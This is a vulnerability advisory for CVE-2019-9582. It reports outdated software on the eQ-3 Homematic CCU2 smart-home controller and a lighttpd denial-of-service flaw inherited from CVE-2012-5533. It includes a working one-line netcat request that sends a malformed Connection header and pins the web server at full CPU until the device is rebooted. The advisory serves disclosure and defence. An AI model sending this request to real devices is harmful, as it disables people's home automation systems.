---
layout: post
title:  "CVE-2019-9582 eQ-3 Homematic CCU2 outdated base software packages allows Denial of Service"
date:   2019-07-24 23:30:00 MEST
author: 'psytester'
---

# Overview

- CVE: CVE-2019-9582
- Author: psytester
- Title: eQ-3 Homematic CCU2 outdated base software packages allows Denial of Service
- Vulnerability Type: CWE-400 Uncontrolled Resource Consumption
-	CVSSv3 Base Score: 7.5
-	CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
- Publishing Date: 24.07.2019
- Updated: --
- Vendor: eQ-3 AG	
- Product: Homematic CCU2
- Vendor contacted: 29.01.2019
- Vendor confirmation: 27.04.2019
- Vendor patch: was promised, but still not fixed!
- Vendor Reference: n.a.
- Affected Firmware version: 2.35.16, 2.41.5, 2.41.8, 2.41.9, 2.45.6, 2.45.7, 2.47.10, 2.47.12, 2.47.15 tested


# Background

From [vendor's website](https://www.eq-3.com/products/homematic/control-units-and-gateways/homematic-central-control-unit-ccu2.html):<br>
HomeMatic Central Control Unit CCU2

Homematic Central Control Unit is the central element of your Homematic system, offering a whole range of control, monitoring and configuration options for all the Homematic devices in your installation<br>
[....]<br>

Past [eQ-3 press release](https://www.eq-3.de/aktuelles/newsreader/eq-3-schliesst-sicherheitsluecken-in-der-ccu.html) about taking security updates seriously (in German only):<br>
[...]<br>
eQ-3 ist es wichtig, dass auch solche Lücken geschlossen werden, die für die meisten Installationen keine Rolle spielen.<br> 
[...]<br>
Obwohl nur Nutzer betroffen sind, die gegen Sicherheitshinweise von eQ-3 verstoßen oder seit mehreren Jahren keine Sicherheitsupdates installiert haben, gibt eQ-3 solchen Fällen hohe Priorität und behebt entsprechende Sicherheitslücken schnellstmöglich nach Bekanntwerden in neuen Software-Versionen und Hotfixes.<br>
[...]


# Issue Description

The analysis of the underlying operating system of the CCU2 revealed that the BusyBox version 1.20.2 from 2012 with a Buildroot 2012.08 is installed as embedded Linux and that other outdated software packages are also used.

Just to name a few:
```
Buildroot 2012.08
BusyBox: v1.20.2
OpenSSH: 6.0p1
wget: GNU Wget 1.13.4
lighttpd: 1.4.31
Up to CCU2 Firmware < 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0_121-b13, profile compact3, headless)
Since CCU2 Firmware >= 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0_201-b09, profile compact3, headless)
Tcl Tk: 8.2.3
....
```

After a search for already known CVE entries, the lighttpd process proved to be susceptible because of [CVE-2012-5533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5533=CVE-2012-5533).<br>

This vulnerability can be exploited by unauthenticated attackers with access to the web interface:
~~~shell
echo -ne "GET / HTTP/1.1\r\nHost: 1.2.3.4\r\nConnection: TC,,Keep-Alive\r\n\r\n" | nc 1.2.3.4 80
~~~
After that the lighttpd is permanently in 99% CPU load and the CCU2 does not react anymore with its ReGa core process because the resources are used up:
```
PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
  321     1 root     R     5548   2%  99% /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```
Just a restart of lighttpd process seems to be not enough to fix the overload condition, a reboot is required.

There might be much more vulnerabilities, as written in my German [blog post](https://psytester.github.io/embedded_Linux_Busybox_Buildroot/) about outdated embedded Linux Busybox/Buildroot installations.

# CVE

[CVE-2019-9582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9582)

# CVSSv3 Base Score

CVSSv3 Base Score: 7.5

CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

# Credit
All researchers.<br>
[cvedetails](https://www.cvedetails.com/) for scanning and preparing all CVEs, separated by vendor and product.<br>
me, but I simply scanned known CVEs to use them.

Not owning an original CCU2 or CCU3, but you want to analyze the CCU 'for free'?<br>
You can download<br>
[piVCCU](https://github.com/alexreinert/piVCCU) for running the original CCU3 Firmware in lxc container on RaspberryPi<br>
[RaspberryMatic](https://github.com/jens-maus/RaspberryMatic) for running the opensource OCCU based release on different boards<br>


# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 by psytester and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
